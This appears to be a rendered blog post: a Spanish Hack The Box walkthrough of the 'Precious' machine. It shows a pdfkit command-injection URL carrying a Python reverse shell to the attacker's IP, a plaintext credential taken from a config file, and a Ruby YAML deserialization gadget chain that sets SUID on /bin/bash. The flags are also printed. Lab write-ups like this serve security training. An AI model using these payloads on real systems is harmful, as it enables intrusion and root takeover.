@@ -1,0 +1,220 @@
+I"�;<p class="lead">Para la intrusion tenemos que la web genera PDFs usando pdfkit con una version vulnerable a Command Injection, la cual conduce a un RCE, para la escalada haremos un ataque YAML deserialization</p>
+
+<h2 id="enumeracion">Enumeracion</h2>
+
+<p>Iniciamos con un escaneo de nmap con el comando:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sS -n -Pn --open -p- 10.10.11.189
+</code></pre></div></div>
+<p>El cual le estamos diciendo que con:</p>
+
+<ul>
+  <li>
+    <p>sS: haga un TCP SYN Scan el cual hace que el destino responda con un RST si el puerto esta cerrado, o con un SYN/ACK si esta abierto, y ademas para que vaya mas rapido</p>
+  </li>
+  <li>
+    <p>n: para que no haga resolucion DNS y tarde menos el escaneo</p>
+  </li>
+  <li>
+    <p>Pn: para evitar el descubrimiento de hosts</p>
+  </li>
+  <li>
+    <p>open: para que solo muestre los puertos abiertos</p>
+  </li>
+  <li>
+    <p>-p-: para que escanee todo el rango de puertos</p>
+  </li>
+</ul>
+
+<p>Esto nos reportara 2 puertos abiertos:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+</code></pre></div></div>
+
+<p>Asi que ahora escanearemos para saber la version y servicio que esta corriendo por detras:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nmap -sCV -p22,80 10.10.11.189
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 845e13a8e31e20661d235550f63047d2 (RSA)
+|   256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA)
+|_  256 33053dcd7ab798458239e7ae3c91a658 (ED25519)
+80/tcp open  http    nginx 1.18.0
+|_http-title: Convert Web Page to PDF
+| http-server-header: 
+|   nginx/1.18.0
+|_  nginx/1.18.0 + Phusion Passenger(R) 6.0.15
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+<p>Tenemos el puerto de SSH abierto, pero aun no podemos hacer mucha cosa, y el puerto 80, el cual de primeras nos dice que podemos convertir una pagina web a un pdf: <code class="language-plaintext highlighter-rouge">http-title: Convert Web Page to PDF</code></p>
+
+<p>Si nos dirigimos a la pagina web, podemos ver que esta esperando por una URL, asi que para comprobar que se puede convertir a PDF, iniciaremos un servidor web con python:</p>
+
+<p><code class="language-plaintext highlighter-rouge">python3 -m http.server 8080</code></p>
+
+<p>Y le pasaremos la URL</p>
+
+<p><img src="/assets/img/precious/precious1.png" alt="" /></p>
+
+<p>Y efecto, convierte la pagina a un pdf, y me muestra el contenido de mi directorio /Desktop</p>
+
+<p><img src="/assets/img/precious/precious2.png" alt="" /></p>
+
+<p>En este punto, una buena idea es ver un poco de los metadatos del pdf, usaremos la herramienta <code class="language-plaintext highlighter-rouge">exiftools</code> (aun que por alguna razon no me jala, asi que usare esta <a href="https://exif.tools/">web</a>)</p>
+
+<p>Y podemos ver que para generarlo esta usando pdfkit:</p>
+
+<p><img src="/assets/img/precious/precious3.png" alt="" /></p>
+
+<h2 id="command-injection">Command Injection</h2>
+
+<p>La version de pdfkit que genero el pdf es la <code class="language-plaintext highlighter-rouge">v0.8.6</code>, asi que… Nunca es mala idea buscar si existe un exploit para la version de algo.</p>
+
+<p>Econtre que esa version de vulnerable a <code class="language-plaintext highlighter-rouge">Command injection</code> a travez del parametro <code class="language-plaintext highlighter-rouge">name</code></p>
+
+<p>Lee <a href="https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795">aqui</a> si quieres saber mas</p>
+
+<p>Asi que intentare ejecutar el comando <code class="language-plaintext highlighter-rouge">whoami</code> para ver si funciona:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.14.102:8080/?name=%20`whoami`
+</code></pre></div></div>
+
+<p><img src="/assets/img/precious/precious4.png" alt="" /></p>
+
+<p>Y una vez sabiendo que si funciona, por lo tanto tenemos Remote Command Execution(RCE), nos mandaremos una reverse shell con python3:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="s">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.102",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'</span>
+</code></pre></div></div>
+
+<p>Y la URL queda:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.14.102:8080/?name=%20`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.102",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`
+</code></pre></div></div>
+<p>Recuerda editar la IP por la que te dio HTB</p>
+
+<h2 id="flag-de-user">Flag de user</h2>
+
+<p>Al lista el contenido podemos ver varios directorios:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ruby@precious:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-lha</span>
+<span class="nb">ls</span> <span class="nt">-lha</span>
+total 28K
+drwxr-xr-x 4 ruby ruby 4.0K Apr 10 16:46 <span class="nb">.</span>
+drwxr-xr-x 4 root root 4.0K Oct 26 08:28 ..
+lrwxrwxrwx 1 root root    9 Oct 26 07:53 .bash_history -&gt; /dev/null
+<span class="nt">-rw-r--r--</span> 1 ruby ruby  220 Mar 27  2022 .bash_logout
+<span class="nt">-rw-r--r--</span> 1 ruby ruby 3.5K Mar 27  2022 .bashrc
+dr-xr-xr-x 2 root ruby 4.0K Oct 26 08:28 .bundle
+drwxr-xr-x 3 ruby ruby 4.0K Apr 10 16:46 .cache
+<span class="nt">-rw-r--r--</span> 1 ruby ruby  807 Mar 27  2022 .profile
+</code></pre></div></div>
+
+<p>Navegando un poco, encontre que en el directorio <code class="language-plaintext highlighter-rouge">.bundle</code> hay un archivo de configuracion el cual tiene unas credenciales:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ruby@precious:~/.bundle<span class="nv">$ </span><span class="nb">cat </span>config
+<span class="nb">cat </span>config
+<span class="nt">---</span>
+BUNDLE_HTTPS://RUBYGEMS__ORG/: <span class="s2">"henry:Q3c1AqGHtoI0aXAYFH"</span>
+</code></pre></div></div>
+
+<p>Y recordemos que tenemos el puerto del SSH abierto, asi que nos conectaremos por ssh con las credenciales que nos aparecen ahi.</p>
+
+<p>usuario: henry</p>
+
+<p>contraseña: Q3c1AqGHtoI0aXAYFH</p>
+
+<p>Y ahora si ya podemos ver la flag de user:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>henry@precious:~<span class="nv">$ </span><span class="nb">cat </span>user.txt 
+8cee1d827eb735217879ec75ce6d2751
+</code></pre></div></div>
+
+<h2 id="flag-de-root">Flag de root</h2>
+
+<p>Primeramente ingresare el comando <code class="language-plaintext highlighter-rouge">sudo -l</code> para poder ver que podemos ejecutar como root desde el usuario <code class="language-plaintext highlighter-rouge">henry</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User henry may run the following commands on precious:
+    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
+</code></pre></div></div>
+
+<p>Nos dice que podemos ejecutar el archivo <code class="language-plaintext highlighter-rouge">update_dependencies.rb</code></p>
+
+<p>Asi que vamos a pasar a ver el contenido del archivo:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Compare installed dependencies with those specified in "dependencies.yml"</span>
+<span class="nb">require</span> <span class="s2">"yaml"</span>
+<span class="nb">require</span> <span class="s1">'rubygems'</span>
+
+<span class="c1"># TODO: update versions automatically</span>
+<span class="k">def</span> <span class="nf">update_gems</span><span class="p">()</span>
+<span class="k">end</span>
+
+<span class="k">def</span> <span class="nf">list_from_file</span>
+    <span class="no">YAML</span><span class="p">.</span><span class="nf">load</span><span class="p">(</span><span class="no">File</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="s2">"dependencies.yml"</span><span class="p">))</span>
+<span class="k">end</span>
+
+<span class="k">def</span> <span class="nf">list_local_gems</span>
+    <span class="no">Gem</span><span class="o">::</span><span class="no">Specification</span><span class="p">.</span><span class="nf">sort_by</span><span class="p">{</span> <span class="o">|</span><span class="n">g</span><span class="o">|</span> <span class="p">[</span><span class="n">g</span><span class="p">.</span><span class="nf">name</span><span class="p">.</span><span class="nf">downcase</span><span class="p">,</span> <span class="n">g</span><span class="p">.</span><span class="nf">version</span><span class="p">]</span> <span class="p">}.</span><span class="nf">map</span><span class="p">{</span><span class="o">|</span><span class="n">g</span><span class="o">|</span> <span class="p">[</span><span class="n">g</span><span class="p">.</span><span class="nf">name</span><span class="p">,</span> <span class="n">g</span><span class="p">.</span><span class="nf">version</span><span class="p">.</span><span class="nf">to_s</span><span class="p">]}</span>
+<span class="k">end</span>
+
+<span class="n">gems_file</span> <span class="o">=</span> <span class="n">list_from_file</span>
+<span class="n">gems_local</span> <span class="o">=</span> <span class="n">list_local_gems</span>
+
+<span class="n">gems_file</span><span class="p">.</span><span class="nf">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">file_name</span><span class="p">,</span> <span class="n">file_version</span><span class="o">|</span>
+    <span class="n">gems_local</span><span class="p">.</span><span class="nf">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">local_name</span><span class="p">,</span> <span class="n">local_version</span><span class="o">|</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">file_name</span> <span class="o">==</span> <span class="n">local_name</span><span class="p">)</span>
+            <span class="k">if</span><span class="p">(</span><span class="n">file_version</span> <span class="o">!=</span> <span class="n">local_version</span><span class="p">)</span>
+                <span class="nb">puts</span> <span class="s2">"Installed version differs from the one specified in file: "</span> <span class="o">+</span> <span class="n">local_name</span>
+            <span class="k">else</span>
+                <span class="nb">puts</span> <span class="s2">"Installed version is equals to the one specified in file: "</span> <span class="o">+</span> <span class="n">local_name</span>
+            <span class="k">end</span>
+        <span class="k">end</span>
+    <span class="k">end</span>
+<span class="k">end</span>
+</code></pre></div></div>
+<p>Me doy cuenta que esta intentando cargar un archivo que se llama <code class="language-plaintext highlighter-rouge">dependencies.yml</code>, el cual no se le esta indicando la ruta, es decir, que lo trata de cargar desde el directorio actual donde se encuentra el usuario, entonces… ¿Por que no crearlo?, y ademas esta usando la funcion <code class="language-plaintext highlighter-rouge">YAML.load()</code> la cual es vulnerable a un ataque<code class="language-plaintext highlighter-rouge">YAML deserialization</code> el cual deriva de un RCE, para saber como explotarlo nos guiaremos de <a href="https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565#file-ruby_yaml_load_sploit2-yaml">aqui</a></p>
+
+<p>Crearemos un archivo yml con el nombre <code class="language-plaintext highlighter-rouge">dependencies.yml</code> en el directorio actual, con el contenido:</p>
+
+<div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nn">---</span>
+<span class="pi">-</span> <span class="kt">!ruby/object:Gem::Installer</span>
+    <span class="na">i</span><span class="pi">:</span> <span class="s">x</span>
+<span class="pi">-</span> <span class="kt">!ruby/object:Gem::SpecFetcher</span>
+    <span class="na">i</span><span class="pi">:</span> <span class="s">y</span>
+<span class="pi">-</span> <span class="kt">!ruby/object:Gem::Requirement</span>
+  <span class="na">requirements</span><span class="pi">:</span>
+    <span class="kt">!ruby/object:Gem::Package::TarReader</span>
+    <span class="na">io</span><span class="pi">:</span> <span class="nl">&amp;1</span> <span class="kt">!ruby/object:Net::BufferedIO</span>
+      <span class="na">io</span><span class="pi">:</span> <span class="nl">&amp;1</span> <span class="kt">!ruby/object:Gem::Package::TarReader::Entry</span>
+         <span class="na">read</span><span class="pi">:</span> <span class="m">0</span>
+         <span class="na">header</span><span class="pi">:</span> <span class="s2">"</span><span class="s">abc"</span>
+      <span class="na">debug_output</span><span class="pi">:</span> <span class="nl">&amp;1</span> <span class="kt">!ruby/object:Net::WriteAdapter</span>
+         <span class="na">socket</span><span class="pi">:</span> <span class="nl">&amp;1</span> <span class="kt">!ruby/object:Gem::RequestSet</span>
+             <span class="na">sets</span><span class="pi">:</span> <span class="kt">!ruby/object:Net::WriteAdapter</span>
+                 <span class="na">socket</span><span class="pi">:</span> <span class="kt">!ruby/module</span> <span class="s1">'</span><span class="s">Kernel'</span>
+                 <span class="na">method_id</span><span class="pi">:</span> <span class="s">:system</span>
+             <span class="na">git_set</span><span class="pi">:</span> <span class="s2">"</span><span class="s">chmod</span><span class="nv"> </span><span class="s">+s</span><span class="nv"> </span><span class="s">/bin/bash"</span>
+         <span class="na">method_id</span><span class="pi">:</span> <span class="s">:resolve</span>
+</code></pre></div></div>
+
+<p>Donde le estamos diciendo que ejecute el comando <code class="language-plaintext highlighter-rouge">chmod +s /bin/bash</code> que le asigna permisos SUID a /bin/bash</p>
+
+<p>Y por ultimo ejecutamos el archivo:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo /usr/bin/ruby /opt/update_dependencies.rb
+</code></pre></div></div>
+<p>Y ya somos root:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-5.1# <span class="nb">whoami
+</span>root
+bash-5.1# <span class="nb">cat</span> /root/root.txt 
+95ff0867c3156b05a0f2d49fc6b1ba48
+</code></pre></div></div>
+
+<p>Eso ha sido todo, gracias por leer ❤</p>
+:ET
